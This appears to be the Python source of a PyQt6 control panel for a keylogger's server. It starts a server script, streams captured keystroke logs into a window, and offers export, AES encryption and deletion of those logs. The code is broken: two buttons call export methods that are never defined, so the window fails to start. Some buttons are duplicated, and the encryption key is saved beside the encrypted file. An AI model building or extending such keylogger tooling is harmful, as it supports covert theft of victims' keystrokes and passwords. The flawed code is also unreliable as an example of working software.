import sys
import threading
import datetime
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout,
    QTextEdit, QGridLayout, QGroupBox, QFileDialog, QMessageBox
)
from PyQt6.QtCore import QTimer
from PyQt6.QtGui import QTextCursor
import subprocess
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

SERVER_SCRIPT = "server.py"
LOG_FILE = "server-copy.txt"

server_process = None


class KeyloggerServerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keylogger Server Manager")
        self.setGeometry(100, 100, 900, 600)
        self.server_running = False

        self.layout = QVBoxLayout()
        self.setLayout(self.layout)

        self.last_log_size = 0

        self.create_header()
        self.create_status_cards()
        self.create_controls()
        self.create_logs_area()
        self.create_log_buttons()     # <-- NEW BUTTONS HERE

        # Timer to update uptime
        self.start_time = None
        self.uptime_timer = QTimer()
        self.uptime_timer.timeout.connect(self.update_uptime)
        self.uptime_timer.start(1000)

        # Timer to refresh logs
        self.log_timer = QTimer()
        self.log_timer.timeout.connect(self.load_logs)
        self.log_timer.start(2000)

        # Apply dark mode
        self.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                color: #f0f0f0;
                font-family: Arial;
                font-size: 12px;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 5px;
                margin-top: 10px;
            }
            QGroupBox:title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 3px;
                color: #ffffff;
                font-weight: bold;
            }
            QPushButton {
                background-color: #444;
                border: 1px solid #555;
                border-radius: 4px;
                padding: 5px;
                color: white;
            }
            QPushButton:hover {
                background-color: #666;
            }
            QTextEdit {
                background-color: #1e1e1e;
                color: #f0f0f0;
                border: 1px solid #444;
            }
            QLabel {
                color: #f0f0f0;
            }
        """)

    def create_header(self):
        header = QHBoxLayout()
        title = QLabel("Keylogger Server")
        title.setStyleSheet("font-size: 24px; font-weight: bold;")
        subtitle = QLabel("Real-time monitoring dashboard")
        subtitle.setStyleSheet("color: gray; font-size: 14px;")
        header.addWidget(title)
        header.addWidget(subtitle)
        header.addStretch()
        self.layout.addLayout(header)

    def create_status_cards(self):
        grid = QGridLayout()

        # ---- CARD 1
        self.server_status_label = QLabel("Offline")
        self.uptime_label = QLabel("00:00:00")
        card1 = QGroupBox("Main Server")
        v1 = QVBoxLayout()
        v1.addWidget(QLabel("Port: 9999"))
        v1.addWidget(QLabel("Session ID: —"))
        v1.addWidget(QLabel("Uptime:"))
        v1.addWidget(self.uptime_label)
        v1.addWidget(self.server_status_label)
        card1.setLayout(v1)
        grid.addWidget(card1, 0, 0)

        # ---- CARD 2
        card2 = QGroupBox("Connections")
        v2 = QVBoxLayout()
        self.total_connections_label = QLabel("0")
        v2.addWidget(QLabel("Total Received:"))
        v2.addWidget(self.total_connections_label)
        card2.setLayout(v2)
        grid.addWidget(card2, 0, 1)

        # ---- CARD 3
        card3 = QGroupBox("Log Storage")
        v3 = QVBoxLayout()
        self.total_logs_label = QLabel("0")
        v3.addWidget(QLabel("Total Logs:"))
        v3.addWidget(self.total_logs_label)
        card3.setLayout(v3)
        grid.addWidget(card3, 0, 2)

        self.layout.addLayout(grid)

    def create_controls(self):
    # ---- SERVER START / STOP ----
        h = QHBoxLayout()

        self.start_btn = QPushButton("Start Server")
        self.start_btn.clicked.connect(self.start_server)
        h.addWidget(self.start_btn)

        self.stop_btn = QPushButton("Stop Server")
        self.stop_btn.clicked.connect(self.stop_server)
        self.stop_btn.setEnabled(False)
        h.addWidget(self.stop_btn)

        self.layout.addLayout(h)

        # ---- EXPORT | ENCRYPT | DELETE ----
        extra = QHBoxLayout()

        export_csv_btn = QPushButton("Export CSV")
        export_csv_btn.clicked.connect(self.export_csv)
        extra.addWidget(export_csv_btn)

        export_json_btn = QPushButton("Export JSON")
        export_json_btn.clicked.connect(self.export_json)
        extra.addWidget(export_json_btn)

        encrypt_btn = QPushButton("Encrypt Logs")
        encrypt_btn.clicked.connect(self.encrypt_logs)
        extra.addWidget(encrypt_btn)

        delete_btn = QPushButton("Delete Logs")
        delete_btn.clicked.connect(self.delete_logs)
        extra.addWidget(delete_btn)

        self.layout.addLayout(extra)


    def create_logs_area(self):
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.layout.addWidget(self.logs_text)

    # -------------------------
    # NEW: EXPORT / ENCRYPT / DELETE BUTTONS
    # -------------------------
    def create_log_buttons(self):
        h = QHBoxLayout()

        export_btn = QPushButton("Export Logs")
        export_btn.clicked.connect(self.export_logs)
        h.addWidget(export_btn)

        encrypt_btn = QPushButton("Encrypt Logs")
        encrypt_btn.clicked.connect(self.encrypt_logs)
        h.addWidget(encrypt_btn)

        delete_btn = QPushButton("Delete Logs")
        delete_btn.clicked.connect(self.delete_logs)
        h.addWidget(delete_btn)

        self.layout.addLayout(h)

    # -------------------------
    # SERVER CONTROL
    # -------------------------
    def start_server(self):
        global server_process
        if not self.server_running:
            server_process = subprocess.Popen(["python", SERVER_SCRIPT])
            self.server_running = True
            self.start_time = datetime.datetime.now()
            self.server_status_label.setText("Online")
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)

    def stop_server(self):
        global server_process
        if self.server_running and server_process:
            server_process.terminate()
            server_process.wait()
            server_process = None
            self.server_running = False
            self.server_status_label.setText("Offline")
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)

    # -------------------------
    # UPTIME + LOGS
    # -------------------------
    def update_uptime(self):
        if self.server_running and self.start_time:
            elapsed = datetime.datetime.now() - self.start_time
            h, remainder = divmod(int(elapsed.total_seconds()), 3600)
            m, s = divmod(remainder, 60)
            self.uptime_label.setText(f"{h:02}:{m:02}:{s:02}")

    def load_logs(self):
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", errors="ignore") as f:
                content = f.read()

            new_content = content[self.last_log_size:]

            if new_content:
                cursor = self.logs_text.textCursor()
                at_bottom = cursor.atEnd()

                self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
                self.logs_text.insertPlainText(new_content)

                if at_bottom:
                    self.logs_text.moveCursor(QTextCursor.MoveOperation.End)

                self.total_logs_label.setText(str(content.count("\n")))

                self.last_log_size = len(content)

    # -------------------------
    # NEW BUTTON FUNCTIONS
    # -------------------------
    def export_logs(self):
        if not os.path.exists(LOG_FILE):
            QMessageBox.warning(self, "Error", "Log file not found.")
            return

        path, _ = QFileDialog.getSaveFileName(self, "Export Logs", "logs.txt")
        if path:
            with open(LOG_FILE, "r", errors="ignore") as f:
                data = f.read()
            with open(path, "w", encoding="utf-8") as f:
                f.write(data)
            QMessageBox.information(self, "Done", "Logs exported successfully!")

    def encrypt_logs(self):
        if not os.path.exists(LOG_FILE):
            QMessageBox.warning(self, "Error", "Log file not found.")
            return

        key = get_random_bytes(32)  # AES-256 key
        cipher = AES.new(key, AES.MODE_EAX)

        with open(LOG_FILE, "rb") as f:
            data = f.read()

        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open("logs.encrypted", "wb") as f:
            f.write(cipher.nonce + tag + ciphertext)

        with open("logs.key", "wb") as f:
            f.write(key)

        QMessageBox.information(self, "Done", "Logs encrypted (logs.encrypted + logs.key).")

    def delete_logs(self):
        open(LOG_FILE, "w").close()
        self.logs_text.clear()
        self.total_logs_label.setText("0")
        self.last_log_size = 0
        QMessageBox.information(self, "Done", "Logs deleted.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = KeyloggerServerGUI()
    window.show()
    sys.exit(app.exec())
